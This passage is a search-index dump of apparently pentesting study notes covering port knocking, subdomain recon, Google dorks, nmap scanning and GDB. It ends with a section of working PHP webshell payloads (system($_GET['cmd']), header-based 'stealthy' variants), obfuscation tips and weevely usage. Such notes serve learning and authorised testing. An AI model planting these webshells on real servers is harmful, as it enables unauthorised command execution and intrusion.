specific sequence a certain port will open automatically. It seems to be more popular in Capture-the-flag contests than real life networks. But I have included it anyways, since CTF:s are great. This is a way to hide certain ports, so you don't get unwanted intrusion-intents. So for example, imagine you access your server through ssh . But you are tired of getting unwanted bruteforce attempts all day long. You can just have the SSH-port closed and when you knock on certain ports in a specific order the ssh-port opens up, maybe for a few minutes, or maybe indefinitely until you close it again. When you \"knock\" on a port you are really just sending TCP-packets with SYN -flag to that port. The closed port will then respond with a ACK/RST . Which basically means that the host has received the TCP -packet, and it ACKnolwdge it, but responds with a Reset ( RST ) flag. RST just means that the port is closed. Software to implement port-knocking # I have seen the Knock software implemented. Opening # So, how do we actually knock? As mentioned before a knock is essentially just sending a packet to a specific port. I guess there are quite a few ways to do this. But here are three ways. Knock apt-get install knockd Then you simply type: knock [ip] [port] . For example: knock 192.168.1.102 4000 5000 6000 After that you have to scan the network to see if any new port is open. If you know what port is open you can connect to the port using netcat. The following command would work nc 192.168.1.102 8888 . This would then connect to the port. Nmap/bash for x in 4000 5000 6000; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x server_ip_address; done Netcat nc 192.168.1.102 4000 nc 192.168.1.102 5000 nc 192.168.1.102 6000 nc 192.168.1.102 8888 Break it # One way hack a server with port-knocking implemented would be to sniff for packets on the network. So if you are on the same network and able to make MITM, you can just sniff that traffic and then find the sequence. Pitfalls # Using port-knocking as a way to secure your service might come with some risk. The biggest risk I suppose is that if the knock-daemon fails, for whatever reason. You will be shut out of you machine. There are of course ways to just restart the knock-daemon if it fails. But maybe that daemon fails as well. References # This wikipedia-article is really worth reading. https://en.wikipedia.org/wiki/Port_knocking","title":"Port Knocking"},{"location":"random_tips_and_tricks/port_knocking/#port-knocking","text":"Port-knocking the a obfuscation-as-security technique. It basically means that after knocking on ports in a specific sequence a certain port will open automatically. It seems to be more popular in Capture-the-flag contests than real life networks. But I have included it anyways, since CTF:s are great. This is a way to hide certain ports, so you don't get unwanted intrusion-intents. So for example, imagine you access your server through ssh . But you are tired of getting unwanted bruteforce attempts all day long. You can just have the SSH-port closed and when you knock on certain ports in a specific order the ssh-port opens up, maybe for a few minutes, or maybe indefinitely until you close it again. When you \"knock\" on a port you are really just sending TCP-packets with SYN -flag to that port. The closed port will then respond with a ACK/RST . Which basically means that the host has received the TCP -packet, and it ACKnolwdge it, but responds with a Reset ( RST ) flag. RST just means that the port is closed.","title":"Port knocking"},{"location":"random_tips_and_tricks/port_knocking/#software-to-implement-port-knocking","text":"I have seen the Knock software implemented.","title":"Software to implement port-knocking"},{"location":"random_tips_and_tricks/port_knocking/#opening","text":"So, how do we actually knock? As mentioned before a knock is essentially just sending a packet to a specific port. I guess there are quite a few ways to do this. But here are three ways. Knock apt-get install knockd Then you simply type: knock [ip] [port] . For example: knock 192.168.1.102 4000 5000 6000 After that you have to scan the network to see if any new port is open. If you know what port is open you can connect to the port using netcat. The following command would work nc 192.168.1.102 8888 . This would then connect to the port. Nmap/bash for x in 4000 5000 6000; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x server_ip_address; done Netcat nc 192.168.1.102 4000 nc 192.168.1.102 5000 nc 192.168.1.102 6000 nc 192.168.1.102 8888","title":"Opening"},{"location":"random_tips_and_tricks/port_knocking/#break-it","text":"One way hack a server with port-knocking implemented would be to sniff for packets on the network. So if you are on the same network and able to make MITM, you can just sniff that traffic and then find the sequence.","title":"Break it"},{"location":"random_tips_and_tricks/port_knocking/#pitfalls","text":"Using port-knocking as a way to secure your service might come with some risk. The biggest risk I suppose is that if the knock-daemon fails, for whatever reason. You will be shut out of you machine. There are of course ways to just restart the knock-daemon if it fails. But maybe that daemon fails as well.","title":"Pitfalls"},{"location":"random_tips_and_tricks/port_knocking/#references","text":"This wikipedia-article is really worth reading. https://en.wikipedia.org/wiki/Port_knocking","title":"References"},{"location":"random_tips_and_tricks/setuid_c-code/","text":"Setuid c-code # Sometimes you need setuid code. Here is a great snippet for it. https://gist.github.com/jblyberg/3899599 #include <unistd.h> #include <errno.h> main( int argc, char ** argv, char ** envp ) { if( setgid(getegid()) ) perror( \"setgid\" ); if( setuid(geteuid()) ) perror( \"setuid\" ); envp = 0; /* blocks IFS attack on non-bash shells */ system( \"/path/to/bash/script\", argv, envp ); perror( argv[0] ); return errno; }","title":"Setuid With C"},{"location":"random_tips_and_tricks/setuid_c-code/#setuid-c-code","text":"Sometimes you need setuid code. Here is a great snippet for it. https://gist.github.com/jblyberg/3899599 #include <unistd.h> #include <errno.h> main( int argc, char ** argv, char ** envp ) { if( setgid(getegid()) ) perror( \"setgid\" ); if( setuid(geteuid()) ) perror( \"setuid\" ); envp = 0; /* blocks IFS attack on non-bash shells */ system( \"/path/to/bash/script\", argv, envp ); perror( argv[0] ); return errno; }","title":"Setuid c-code"},{"location":"recon/finding_subdomains/","text":"Find Subdomains # Finding subdomains is fundamental. The more subdomains you find, the bigger attack surface you have. Which means bigger possibility of success. For now this seems to be a very comprehensive list of tools to find subdomains. https://blog.bugcrowd.com/discovering-subdomains Some tools find some stuff, other tools other stuff. So your best bet is to use a few of them together. Don't forget to brute-force recursively! Ways to find subdomains # Brute force Search engine responses SSL Certificates DNS records Brute force # Search engines # Lists subdomains that is has encountered: https://www.virustotal.com Not sure how this works: https://dnsdumpster.com recon-ng # In order to find subdomains we can use the recon-ng framework. It has the same basic structure as metasploit. You can learn more about this tool in the tools-section. recon-ng use use recon/domains-hosts/ # This will give you a vast amount of alternatives. show options set source cnn.com All these subdomains will be saved in hosts , which you can access though: show hosts If some of these subdomains are not given IPs automatically you can just run use recon/hosts-hosts/resolve run And it will resolve all the hosts in the hosts-file. Google Dorks # Using google we can also find subdomains. This will only give us the subdomains of a site. site:msn.com -site:www.msn.com site:*.nextcloud.com To exclude a specific subdomain you can do this: site:*.nextcloud.com -site:help.nextcloud.com subbrute.py # The basic command is like this ./subbrute.py -p cnn.com https://github.com/TheRook/subbrute Knock # I haven't tested this yet. https://github.com/guelfoweb/knock Reverse DNS-lookup # If you manage to figure out the IP range that the target owns (see section about nmap below). You can see which machines are online. And then you can run a script to find out the domain-addresses of those machines. That way you might find something new. The text-file onlyIps.txt is a textfile with one IP-address on each line. #!/bin/bash while read p; do echo $p; host $p done <onlyIps.txt Here are some more tools that can do reverse lookup http://www.cyberciti.biz/faq/how-to-test-or-check-reverse-dns/ Online tools # https://dnsdumpster.com/ https://pentest-tools.com/information-gathering/find-subdomains-of-domain http://www.intodns.com/ This tool doesn't enumerate subdomains per se. But it hands of a lot of information about domains. http://www.dnsstuff.com/ Bypassing CloudFlare # https://www.ericzhang.me/resolve-cloudflare-ip-leakage/ #This tool can be used to find old IPs. It could mean that the http://toolbar.netcraft.com/site_report?url=lyst.com Brute force dictionaries # If you try to brute force the domains it is a good idea to have a good dictionary. That can be found here: Bitquark https://github.com/bitquark/dnspop SecList https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS References # https://en.wikipedia.org/wiki/CNAME_record","title":"Finding Subdomains"},{"location":"recon/finding_subdomains/#find-subdomains","text":"Finding subdomains is fundamental. The more subdomains you find, the bigger attack surface you have. Which means bigger possibility of success. For now this seems to be a very comprehensive list of tools to find subdomains. https://blog.bugcrowd.com/discovering-subdomains Some tools find some stuff, other tools other stuff. So your best bet is to use a few of them together. Don't forget to brute-force recursively!","title":"Find Subdomains"},{"location":"recon/finding_subdomains/#ways-to-find-subdomains","text":"Brute force Search engine responses SSL Certificates DNS records","title":"Ways to find subdomains"},{"location":"recon/finding_subdomains/#brute-force","text":"","title":"Brute force"},{"location":"recon/finding_subdomains/#search-engines","text":"Lists subdomains that is has encountered: https://www.virustotal.com Not sure how this works: https://dnsdumpster.com","title":"Search engines"},{"location":"recon/finding_subdomains/#recon-ng","text":"In order to find subdomains we can use the recon-ng framework. It has the same basic structure as metasploit. You can learn more about this tool in the tools-section. recon-ng use use recon/domains-hosts/ # This will give you a vast amount of alternatives. show options set source cnn.com All these subdomains will be saved in hosts , which you can access though: show hosts If some of these subdomains are not given IPs automatically you can just run use recon/hosts-hosts/resolve run And it will resolve all the hosts in the hosts-file.","title":"recon-ng"},{"location":"recon/finding_subdomains/#google-dorks","text":"Using google we can also find subdomains. This will only give us the subdomains of a site. site:msn.com -site:www.msn.com site:*.nextcloud.com To exclude a specific subdomain you can do this: site:*.nextcloud.com -site:help.nextcloud.com","title":"Google Dorks"},{"location":"recon/finding_subdomains/#subbrutepy","text":"The basic command is like this ./subbrute.py -p cnn.com https://github.com/TheRook/subbrute","title":"subbrute.py"},{"location":"recon/finding_subdomains/#knock","text":"I haven't tested this yet. https://github.com/guelfoweb/knock","title":"Knock"},{"location":"recon/finding_subdomains/#reverse-dns-lookup","text":"If you manage to figure out the IP range that the target owns (see section about nmap below). You can see which machines are online. And then you can run a script to find out the domain-addresses of those machines. That way you might find something new. The text-file onlyIps.txt is a textfile with one IP-address on each line. #!/bin/bash while read p; do echo $p; host $p done <onlyIps.txt Here are some more tools that can do reverse lookup http://www.cyberciti.biz/faq/how-to-test-or-check-reverse-dns/","title":"Reverse DNS-lookup"},{"location":"recon/finding_subdomains/#online-tools","text":"https://dnsdumpster.com/ https://pentest-tools.com/information-gathering/find-subdomains-of-domain http://www.intodns.com/ This tool doesn't enumerate subdomains per se. But it hands of a lot of information about domains. http://www.dnsstuff.com/","title":"Online tools"},{"location":"recon/finding_subdomains/#bypassing-cloudflare","text":"https://www.ericzhang.me/resolve-cloudflare-ip-leakage/ #This tool can be used to find old IPs. It could mean that the http://toolbar.netcraft.com/site_report?url=lyst.com","title":"Bypassing CloudFlare"},{"location":"recon/finding_subdomains/#brute-force-dictionaries","text":"If you try to brute force the domains it is a good idea to have a good dictionary. That can be found here: Bitquark https://github.com/bitquark/dnspop SecList https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS","title":"Brute force dictionaries"},{"location":"recon/finding_subdomains/#references","text":"https://en.wikipedia.org/wiki/CNAME_record","title":"References"},{"location":"recon/google_hacking/","text":"Search Engine Discovery # Search engines can be very useful for finding information about the target. Search engines can be used for two things: Finding sensitive information on the domain that you are attacking Finding sensitive information about the company and its employees in on other parts of the internet. Like forums, newsgroups etc. Remember that the world is bigger than google. So test out the other search engines. Baidu, binsearch.info, Bing, DuckDuckGo, ixquick/Startpage, Shodan,PunkSpider Google is a good tool to learn more about a website. Finding specific filetypes # filetype:pdf Search within webaddress # site:example.com myword Find in url # inurl:test.com Wild cards # You can use the asterisk to as a wildcard: * Example: \"I've been * for a heart\" This will return answers where * is anything. Exclude words # - the dash excludes a specific word This query searches for pages that used the word bananasplit. -banana bananasplit Cached version # So if a website has been taken down you can still find the cached version, of the last time google visited the site cache:website.com https://www.blackhat.com/presentations/bh-europe-05/BH_EU_05-Long.pdf Examples # site:com inurl:admin.php More # Here are some more Great guide for google dorks https://www.blackhat.com/presentations/bh-europe-05/BH_EU_05-Long.pdf http://www.googleguide.com/advanced_operators_reference.html http://www.searchcommands.com/ https://support.google.com/websearch/answer/2466433?hl=en https://www.exploit-db.com/google-hacking-database/","title":"Google Hacking"},{"location":"recon/google_hacking/#search-engine-discovery","text":"Search engines can be very useful for finding information about the target. Search engines can be used for two things: Finding sensitive information on the domain that you are attacking Finding sensitive information about the company and its employees in on other parts of the internet. Like forums, newsgroups etc. Remember that the world is bigger than google. So test out the other search engines. Baidu, binsearch.info, Bing, DuckDuckGo, ixquick/Startpage, Shodan,PunkSpider Google is a good tool to learn more about a website.","title":"Search Engine Discovery"},{"location":"recon/google_hacking/#finding-specific-filetypes","text":"filetype:pdf","title":"Finding specific filetypes"},{"location":"recon/google_hacking/#search-within-webaddress","text":"site:example.com myword","title":"Search within webaddress"},{"location":"recon/google_hacking/#find-in-url","text":"inurl:test.com","title":"Find in url"},{"location":"recon/google_hacking/#wild-cards","text":"You can use the asterisk to as a wildcard: * Example: \"I've been * for a heart\" This will return answers where * is anything.","title":"Wild cards"},{"location":"recon/google_hacking/#exclude-words","text":"- the dash excludes a specific word This query searches for pages that used the word bananasplit. -banana bananasplit","title":"Exclude words"},{"location":"recon/google_hacking/#cached-version","text":"So if a website has been taken down you can still find the cached version, of the last time google visited the site cache:website.com https://www.blackhat.com/presentations/bh-europe-05/BH_EU_05-Long.pdf","title":"Cached version"},{"location":"recon/google_hacking/#examples","text":"site:com inurl:admin.php","title":"Examples"},{"location":"recon/google_hacking/#more","text":"Here are some more Great guide for google dorks https://www.blackhat.com/presentations/bh-europe-05/BH_EU_05-Long.pdf http://www.googleguide.com/advanced_operators_reference.html http://www.searchcommands.com/ https://support.google.com/websearch/answer/2466433?hl=en https://www.exploit-db.com/google-hacking-database/","title":"More"},{"location":"recon/passive_information_gathering/","text":"Passive information gathering # Whois # Find out who is behind the website. Resolve the DNS host website.com nslookup website.com The the IP address and check it with whois whois 192.168.1.101 Netcraft # Most of the info found on netcraft is not unique. It is basic whois info. But one thing is really good, it lists the different IP-addresses the page has had over the years. This can be a good way to bypass cloudflare and other services that hide the real IP. Using netcraft we can find the IP that was in use before they implemented cloudflare. Another detail that is good to know is the hosting-company or domain-provider . Those details can be used if we want to try some social-engineering or spear-phishing attack . Netcraft References # http://www.technicalinfo.net/papers/PassiveInfoPart1.html","title":"Passive Information Gathering"},{"location":"recon/passive_information_gathering/#passive-information-gathering","text":"","title":"Passive information gathering"},{"location":"recon/passive_information_gathering/#whois","text":"Find out who is behind the website. Resolve the DNS host website.com nslookup website.com The the IP address and check it with whois whois 192.168.1.101","title":"Whois"},{"location":"recon/passive_information_gathering/#netcraft","text":"Most of the info found on netcraft is not unique. It is basic whois info. But one thing is really good, it lists the different IP-addresses the page has had over the years. This can be a good way to bypass cloudflare and other services that hide the real IP. Using netcraft we can find the IP that was in use before they implemented cloudflare. Another detail that is good to know is the hosting-company or domain-provider . Those details can be used if we want to try some social-engineering or spear-phishing attack . Netcraft","title":"Netcraft"},{"location":"recon/passive_information_gathering/#references","text":"http://www.technicalinfo.net/papers/PassiveInfoPart1.html","title":"References"},{"location":"recon/port_scanning/","text":"Port Scanning # TLDR # # Stealthy nmap -sS 10.11.1.X # Scan all ports, might take a while. nmap 10.11.1.X -p- # Scan for UDP nmap 10.11.1.X -sU unicornscan -mU -v -I 10.11.1.X # Scan for version, with NSE-scripts and trying to identify OS nmap 10.11.1.X -sV -sC -O # All out monsterscan nmap -vvv -Pn -A -iL listOfIP.txt # Fast scan nmap 10.11.1.X -F # Only scan the 100 most common ports nmap 10.11.1.X --top-ports 100 Nmap # Now that you have gathered some IP addresses from your subdomain scanning it is time to scan those addresses. You just copy-paste those addresses and add them to a file, line by line. Then you can scan all of them with nmap at the same time. Using the -iL flag. Basics - tcp-connect scan # Okay, so a bit of the basics of Nmap and how it works. When one machine initiate a connection with another machine using the transmission-control protocol (tcp) it performs what is know as a three-way handshake. That means: machine1 sends a syn packet to machine2 machine2 send a syn-ack packet to machine1 machine1 sends a ack packet to machine2. If machine2 responds with a syn-ack we know that that port is open. This is basically what nmap does when it scans for a port. If machine1 omits the last ack packet the connection is not made. This can be a way to make less noise. This is the default mode for nmap. If you do not add any flags and scan a machine this is the type of connection it creates. \"Stealthy\" -sS # By adding the -sS flag we are telling nmap to not finalize the three way handshake. It will send a syn , receive syn-ack (if the port is open), and then terminate the connection. This used to be considered stealthy before, since it was often not logged. However it should not be considered stealthy anymore. In the flag I imagine that the first s stands for scan/scantype and the second S stands for syn . So -sS can be read as scantype syn UDP scan # UDP is after TCP the most common protocol. DNS (53), SNMP (161/162) and DHCP (67/68) are some common ones. Scanning for it is slow and unreliable. -sU Output scan to a textfile # Not all output works with grepable format. For example NSE does not work with grepable. So you might want to use xml instead. # To text-file -oN nameOfFile # To grepable format -oG nameOfFile # To xml -oX nameOfFile Scan an entire IP-range # You might find that a site has several machines on the same ip-range. You can then use nmap to scan the whole range. The -sn flag stops nmap from running port-scans. So it speeds up the process. nmap -vvv -sn 201.210.67.0/24 You can also specify a specific range, like this nmap -sP 201.210.67.0-100 ```` #### Sort out the machines that are up So let's say you find that 40 machine exists in that range. We can use grep to output those IP:s. First let's find the IPs that were online. Ip-range is the output from previous command. You can of course combine them all. ```bash cat ip-range.txt | grep -B 1 \"Host is up\" Now let's sort out the ips from that file. grep -o '[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}' ip-range.txt > only-ip.txt Now you can input all those ips to nmap and scan them. Scan a range and output if a specific port is open # Nmap has a command to make the output grepable. nmap -vvv -p 80 201.210.67.0-100 -oG - | grep 80/open Nmap scripts # This chapter could also be placed in Vulnerability-analysis and Exploitation. Because nmap scripting is a really versatile tool that can do many things. Here we will focus on it's ability to retrieve information that can be useful in the process to find vulnerabilities First locate the nmap scripts. Nmap scripts end in .nse . For Nmap script engine. locate *.nse The syntax for running a script is: nmap --script scriptname 192.168.1.101 To find the \"man\"-pages, the info about a script we write: nmap -script-help http-vuln-cve2013-0156.nse Run multiple scripts Can be run by separating the script with a comma nmap --script scriptone.nse,sciprt2.nse,script3.nse 192.168.1.101 Run the default scripts nmap -sC example.com Metasploit # We can do port-scanning with metasploit and nmap. And we can even integrate nmap into metasploit. This might be a good way to keep your process neat and organized. db_nmap # You can run db_nmap and all the output will be stored in the metasploit database and available with hosts services You can also import nmap scans. But you must first output it in xml-format with the following flag nmap 192.168.1.107 -oX result.xml Good practice would be to output the scan-results in xml, grepable and normal format. You do that with nmap 192.168.1.107 -oA result Then you can load it into the database with the following command. db_import /path/to/file.xml Metasploit PortScan modules # If you for some reason don't have access to nmap you can run metasploits modules that does portscans use auxiliary/scanner/portscan/","title":"Port Scanning"},{"location":"recon/port_scanning/#port-scanning","text":"","title":"Port Scanning"},{"location":"recon/port_scanning/#tldr","text":"# Stealthy nmap -sS 10.11.1.X # Scan all ports, might take a while. nmap 10.11.1.X -p- # Scan for UDP nmap 10.11.1.X -sU unicornscan -mU -v -I 10.11.1.X # Scan for version, with NSE-scripts and trying to identify OS nmap 10.11.1.X -sV -sC -O # All out monsterscan nmap -vvv -Pn -A -iL listOfIP.txt # Fast scan nmap 10.11.1.X -F # Only scan the 100 most common ports nmap 10.11.1.X --top-ports 100","title":"TLDR"},{"location":"recon/port_scanning/#nmap","text":"Now that you have gathered some IP addresses from your subdomain scanning it is time to scan those addresses. You just copy-paste those addresses and add them to a file, line by line. Then you can scan all of them with nmap at the same time. Using the -iL flag.","title":"Nmap"},{"location":"recon/port_scanning/#basics-tcp-connect-scan","text":"Okay, so a bit of the basics of Nmap and how it works. When one machine initiate a connection with another machine using the transmission-control protocol (tcp) it performs what is know as a three-way handshake. That means: machine1 sends a syn packet to machine2 machine2 send a syn-ack packet to machine1 machine1 sends a ack packet to machine2. If machine2 responds with a syn-ack we know that that port is open. This is basically what nmap does when it scans for a port. If machine1 omits the last ack packet the connection is not made. This can be a way to make less noise. This is the default mode for nmap. If you do not add any flags and scan a machine this is the type of connection it creates.","title":"Basics - tcp-connect scan"},{"location":"recon/port_scanning/#stealthy-ss","text":"By adding the -sS flag we are telling nmap to not finalize the three way handshake. It will send a syn , receive syn-ack (if the port is open), and then terminate the connection. This used to be considered stealthy before, since it was often not logged. However it should not be considered stealthy anymore. In the flag I imagine that the first s stands for scan/scantype and the second S stands for syn . So -sS can be read as scantype syn","title":"\"Stealthy\" -sS"},{"location":"recon/port_scanning/#udp-scan","text":"UDP is after TCP the most common protocol. DNS (53), SNMP (161/162) and DHCP (67/68) are some common ones. Scanning for it is slow and unreliable. -sU","title":"UDP scan"},{"location":"recon/port_scanning/#output-scan-to-a-textfile","text":"Not all output works with grepable format. For example NSE does not work with grepable. So you might want to use xml instead. # To text-file -oN nameOfFile # To grepable format -oG nameOfFile # To xml -oX nameOfFile","title":"Output scan to a textfile"},{"location":"recon/port_scanning/#scan-an-entire-ip-range","text":"You might find that a site has several machines on the same ip-range. You can then use nmap to scan the whole range. The -sn flag stops nmap from running port-scans. So it speeds up the process. nmap -vvv -sn 201.210.67.0/24 You can also specify a specific range, like this nmap -sP 201.210.67.0-100 ```` #### Sort out the machines that are up So let's say you find that 40 machine exists in that range. We can use grep to output those IP:s. First let's find the IPs that were online. Ip-range is the output from previous command. You can of course combine them all. ```bash cat ip-range.txt | grep -B 1 \"Host is up\" Now let's sort out the ips from that file. grep -o '[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}' ip-range.txt > only-ip.txt Now you can input all those ips to nmap and scan them.","title":"Scan an entire IP-range"},{"location":"recon/port_scanning/#scan-a-range-and-output-if-a-specific-port-is-open","text":"Nmap has a command to make the output grepable. nmap -vvv -p 80 201.210.67.0-100 -oG - | grep 80/open","title":"Scan a range and output if a specific port is open"},{"location":"recon/port_scanning/#nmap-scripts","text":"This chapter could also be placed in Vulnerability-analysis and Exploitation. Because nmap scripting is a really versatile tool that can do many things. Here we will focus on it's ability to retrieve information that can be useful in the process to find vulnerabilities First locate the nmap scripts. Nmap scripts end in .nse . For Nmap script engine. locate *.nse The syntax for running a script is: nmap --script scriptname 192.168.1.101 To find the \"man\"-pages, the info about a script we write: nmap -script-help http-vuln-cve2013-0156.nse Run multiple scripts Can be run by separating the script with a comma nmap --script scriptone.nse,sciprt2.nse,script3.nse 192.168.1.101 Run the default scripts nmap -sC example.com","title":"Nmap scripts"},{"location":"recon/port_scanning/#metasploit","text":"We can do port-scanning with metasploit and nmap. And we can even integrate nmap into metasploit. This might be a good way to keep your process neat and organized.","title":"Metasploit"},{"location":"recon/port_scanning/#db_nmap","text":"You can run db_nmap and all the output will be stored in the metasploit database and available with hosts services You can also import nmap scans. But you must first output it in xml-format with the following flag nmap 192.168.1.107 -oX result.xml Good practice would be to output the scan-results in xml, grepable and normal format. You do that with nmap 192.168.1.107 -oA result Then you can load it into the database with the following command. db_import /path/to/file.xml","title":"db_nmap"},{"location":"recon/port_scanning/#metasploit-portscan-modules","text":"If you for some reason don't have access to nmap you can run metasploits modules that does portscans use auxiliary/scanner/portscan/","title":"Metasploit PortScan modules"},{"location":"tools/gdb/","text":"Tools # These are our tools: - ltrace - strings - file - objdump - gdb This is a great little trick. If you are working a lot with hexadecimal and you want to easily convert it to ascii you can write this in bash echo 6a6548 | xxd -r -p will print out: jeH xxd is a program that makes ascii into hexdumps. with the -r we can reverse it. Nasm to opcode # If we want to convert an assembly instruction to opcode we can use this tool /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb nasm > JMP ESP 00000000 FFE4 jmp esp Objdump # Objdump is a program that outputs the assembly code of a compiled program. It ca be executed like this. example: objdump -D myProgram objdump -M intel -d program_name ;This is to read the assembly in intel-syntax GDB - GNU Debugger # Setting breakpoints # Sometimes you want the debugger to stop at a certain point in the program, so that you can investigate memory and stuff. We can set these breakpoints with the following command: Set a break at the main-function break main Set a break at that line. I think it is set before the line is executed. break 10 Show breakpoints If you want to know which breakpoints you have set you can run: info breakpoint info break info b Remove breakpoints Will delete all breakpoints on line 9 clear 9 Run the program run Show code list ; show code if you have compile it with the -g flag list 10` ; will show the code around line 10. five lines before, and five lines after. list 1,20 ; will list all lines between the numbers. This shows the code in assembly. It is pretty much the same as running objdump. disassemble main Show info about instruct pointer info register eip i r eip On 64bit machines it is called rip instead of eip . It basically shows to what address eip is pointing at. So the output might be something like this: (gdb) i r rip rip 0x4004aa 0x4004aa <main+4> Which means that rip at this moment is pointing at 0x4004aa. Which means that this is going to be the next instruct that gets executed. The structure is like this: examine/[format] address x/ Format is how you want to display the memory. Here are the following formats: o - octal x - hexadecimal d - decimal u - unsigned decimal t - binary f - floating point a - address c - char s - string i - instruction Example: x/s myVariable This means: examine myVariable, and output the content in that memory in the form of a string. Now this does not work for values that does not have a memory address. It will just give you ` 0x16: Cannot access memory at address 0x16 That is because the variable is not a pointer (it does not point to an memory-address), but instead it is a hardcoded value. x/i $rip Examine/info instruction pointer register. This command can be used to examine a specific part of memory. In this example it was the instruct pointer, but it can also be a specific address in memory. Show all functions # info funcions Python Python can be quite useful go generate strings as input. Of course this can be done with a lot of other languages. so it would work like this. ./myProgram $(python -c 'print \"\\x41\" * 30') Basically, the $(python) creates a shell within our command. And in that shell we run the normal python command. The -c flag tells python that we are going to run a command instead of opening up the interactive shell. You can test this in the terminal like this: $ python -c 'print \"hello\" * 100' hellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohello GCC # Compile the program in debugger mode, so that the debugger has access to the code. gcc -g program.c","title":"GDB"},{"location":"tools/gdb/#tools","text":"These are our tools: - ltrace - strings - file - objdump - gdb This is a great little trick. If you are working a lot with hexadecimal and you want to easily convert it to ascii you can write this in bash echo 6a6548 | xxd -r -p will print out: jeH xxd is a program that makes ascii into hexdumps. with the -r we can reverse it.","title":"Tools"},{"location":"tools/gdb/#nasm-to-opcode","text":"If we want to convert an assembly instruction to opcode we can use this tool /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb nasm > JMP ESP 00000000 FFE4 jmp esp","title":"Nasm to opcode"},{"location":"tools/gdb/#objdump","text":"Objdump is a program that outputs the assembly code of a compiled program. It ca be executed like this. example: objdump -D myProgram objdump -M intel -d program_name ;This is to read the assembly in intel-syntax","title":"Objdump"},{"location":"tools/gdb/#gdb-gnu-debugger","text":"","title":"GDB - GNU Debugger"},{"location":"tools/gdb/#setting-breakpoints","text":"Sometimes you want the debugger to stop at a certain point in the program, so that you can investigate memory and stuff. We can set these breakpoints with the following command: Set a break at the main-function break main Set a break at that line. I think it is set before the line is executed. break 10 Show breakpoints If you want to know which breakpoints you have set you can run: info breakpoint info break info b Remove breakpoints Will delete all breakpoints on line 9 clear 9 Run the program run Show code list ; show code if you have compile it with the -g flag list 10` ; will show the code around line 10. five lines before, and five lines after. list 1,20 ; will list all lines between the numbers. This shows the code in assembly. It is pretty much the same as running objdump. disassemble main Show info about instruct pointer info register eip i r eip On 64bit machines it is called rip instead of eip . It basically shows to what address eip is pointing at. So the output might be something like this: (gdb) i r rip rip 0x4004aa 0x4004aa <main+4> Which means that rip at this moment is pointing at 0x4004aa. Which means that this is going to be the next instruct that gets executed. The structure is like this: examine/[format] address x/ Format is how you want to display the memory. Here are the following formats: o - octal x - hexadecimal d - decimal u - unsigned decimal t - binary f - floating point a - address c - char s - string i - instruction Example: x/s myVariable This means: examine myVariable, and output the content in that memory in the form of a string. Now this does not work for values that does not have a memory address. It will just give you ` 0x16: Cannot access memory at address 0x16 That is because the variable is not a pointer (it does not point to an memory-address), but instead it is a hardcoded value. x/i $rip Examine/info instruction pointer register. This command can be used to examine a specific part of memory. In this example it was the instruct pointer, but it can also be a specific address in memory.","title":"Setting breakpoints"},{"location":"tools/gdb/#show-all-functions","text":"info funcions Python Python can be quite useful go generate strings as input. Of course this can be done with a lot of other languages. so it would work like this. ./myProgram $(python -c 'print \"\\x41\" * 30') Basically, the $(python) creates a shell within our command. And in that shell we run the normal python command. The -c flag tells python that we are going to run a command instead of opening up the interactive shell. You can test this in the terminal like this: $ python -c 'print \"hello\" * 100' hellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohello","title":"Show all functions"},{"location":"tools/gdb/#gcc","text":"Compile the program in debugger mode, so that the debugger has access to the code. gcc -g program.c","title":"GCC"},{"location":"tools/webshell/","text":"Webshell # A webshell is a shell that you can access through the web. This is useful for when you have firewalls that filter outgoing traffic on ports other than port 80. As long as you have a webserver, and want it to function, you can't filter our traffic on port 80 (and 443). It is also a bit more stealthy than a reverse shell on other ports since the traffic is hidden in the http traffic. You have access to different kinds of webshells on Kali here: /usr/share/webshells PHP # This code can be injected into pages that use php. # Execute one command <?php system(\"whoami\"); ?> # Take input from the url paramter. shell.php?cmd=whoami <?php system($_GET['cmd']); ?> # The same but using passthru <?php passthru($_GET['cmd']); ?> # For shell_exec to output the result you need to echo it <?php echo shell_exec(\"whoami\");?> # Exec() does not output the result without echo, and only output the last line. So not very useful! <?php echo exec(\"whoami\");?> # Instead to this if you can. It will return the output as an array, and then print it all. <?php exec(\"ls -la\",$array); print_r($array); ?> # preg_replace(). This is a cool trick <?php preg_replace('/.*/e', 'system(\"whoami\");', ''); ?> # Using backticks <?php $output = `whoami`; echo \"<pre>$output</pre>\"; ?> # Using backticks <?php echo `whoami`; ?> You can then call then execute the commands like this: http://192.168.1.103/index.php?cmd=pwd Make it stealthy # We can make the commands from above a bit more stealthy. Instead of passing the cmds through the url, which will be obvious in logs, we cna pass them through other header-paramters. The use tampterdata or burpsuite to insert the commands. Or just netcat or curl. <?php system($_SERVER['HTTP_ACCEPT_LANGUAGE']); ?> <?php system($_SERVER['HTTP_USER_AGENT'])?> # I have had to use this one <?php echo passthru($_SERVER['HTTP_ACCEPT_LANGUAGE']); ?> Obfuscation # The following functions can be used to obfuscate the code. eval() assert() base64() gzdeflate() str_rot13() Weevely - Incredible tool! # Using weevely we can create php webshells easily. weevely generate password /root/webshell.php Not we execute it and get a shell in return: weevely \"http://192.168.1.101/webshell.php\" password ASP # <% Dim oS On Error Resume Next Set oS = Server.CreateObject(\"WSCRIPT.SHELL\") Call oS.Run(\"win.com cmd.exe /c 